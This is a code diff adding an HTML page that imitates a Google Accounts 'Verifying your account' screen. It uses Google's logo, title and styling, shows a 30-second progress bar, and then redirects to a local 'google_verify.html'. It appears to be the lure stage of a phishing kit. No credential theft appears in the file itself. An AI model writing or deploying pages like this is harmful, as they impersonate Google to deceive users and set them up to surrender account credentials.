@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying... - Google Accounts</title>
+    <style>
+        body { 
+            font-family: 'Roboto', arial, sans-serif; 
+            background-color: #fff; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .container { 
+            text-align: center; 
+            width: 300px; 
+        }
+        .logo { 
+            width: 75px; 
+            margin-bottom: 20px; 
+        }
+        .loading-text { 
+            font-size: 16px; 
+            color: #202124; 
+            margin-bottom: 20px; 
+        }
+        /* Loading Bar Style */
+        .progress-container { 
+            width: 100%; 
+            background-color: #f1f3f4; 
+            border-radius: 10px; 
+            overflow: hidden; 
+            height: 10px; 
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .progress-bar { 
+            width: 0%; 
+            height: 100%; 
+            background-color: #1a73e8; 
+            transition: width 0.1s linear; 
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x122dp.png" class="logo" alt="Google">
+        <div class="loading-text">Verifying your account...</div>
+        <div class="progress-container">
+            <div class="progress-bar" id="myBar"></div>
+        </div>
+    </div>
+
+    <script>
+        let i = 0;
+        const bar = document.getElementById('myBar');
+        
+        // 30 seconds loading logic (30000ms)
+        // Increment every 100ms by ~0.33% to reach 100% in 30 seconds
+        setInterval(function() {
+            if (i < 100) {
+                i += 0.333; 
+                bar.style.width = i + '%';
+            } else {
+                // Once 100% is reached, redirect to the verification page
+                window.location.href = 'google_verify.html';
+            }
+        }, 100);
+    </script>
+
+</body>
+</html>
